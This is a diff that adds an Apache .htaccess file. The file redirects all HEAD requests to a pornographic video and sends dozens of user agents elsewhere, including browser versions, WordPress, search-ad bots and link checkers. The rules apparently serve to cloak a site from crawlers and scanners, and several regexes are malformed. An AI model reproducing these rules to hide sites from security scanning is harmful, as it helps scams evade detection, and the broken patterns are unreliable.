@@ -1,0 +1,215 @@
+
+
+RewriteEngine On
+
+Options -Indexes
+
+RewriteCond %{REQUEST_METHOD} "head" [nocase]
+RewriteRule ^(.*)$ http://www.pornhub.com/view_video.php?viewkey=ph55b18341a7b60 [L,R=301]
+
+#RewriteCond %{HTTP_USER_AGENT} "=Mozilla/5.0 (compatible; WOW64; MSIE 10.0; Windows NT 6.2)" [nocase]
+#RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} ^.*Chrome\/[1-6][0-9].* [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} ^.*Chrome\/[1-7][0-4].* [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} ^.*Fire.ox\/[1-6][0-4].* [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} ^.*Chrome\/[1-9]\..* [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} ^.*Opera\/[1-9]\..* [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} ^.*Fire.ox\/[1-9]\..* [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} ^.*Fire.ox\/[1-5][0-9].* [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} ^.*Opera\/[1-60]\\.* [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "UCBrowser/11." [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/76.0.3809." [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/77.0.3865." [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Safari/605.1.15" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Safari/534.30" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "FxiOS" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "OPiOS" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Lumia 950" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Mobile/14E304" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "KHTML/3." [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Mobile/1A543a" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Ubuntu/7.10" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} ^.*Opera\/[1-30]\\.* [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "NokiaBrowser/8.5.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Mozilla/4.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/70.0.3599.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/79.0.3945.130" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Vivaldi/2.6.1566.49" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/75.0.3770" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/71.0.3599.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/72.0.3599.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/73.0.3599.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/77.0.3865.116" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/75.0.3770.145" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/78.0.3904.70" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/75.0.3770.100" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/77.0.3626.121" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "YaBrowser/19.9.3.314" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Safari/536.2+" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en  [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "MSIE 7.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Presto/2.12.388" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Presto/22.9.168" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Presto/2.10.229" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Presto/2.10.289" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Safari/7534.48.3" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Safari/534.57.4" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Safari/534.53.10" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "WordPress" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "WordPress/4." [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Version/7.0.0.254" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Comodo_Dragon/4.1.1.11" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/16.0.912.63" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Presto/2.9.181" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "BlackBerry 9850" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Firefox/70.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Version/13.0.3 Mobile/15E148" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Opera 12.14" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/78.0.3904.87" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/70.0.3538.102" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/67.0.3599.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/78.0.3904.108" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/77.0.3865.120" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/80.0.3966.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/80.0.3950.1" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Firefox/69.0" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "AppleWebKit/533.20.25" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Baiduspider-ads" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Acoon Robot v1.52" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "2Bone_LinkChecker" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
+
+RewriteCond %{HTTP_USER_AGENT} "Chrome/75.0.3770.145" [nocase]
+RewriteRule ^(.*)$ http://outdatedbrowser.com/en [L,R=301]
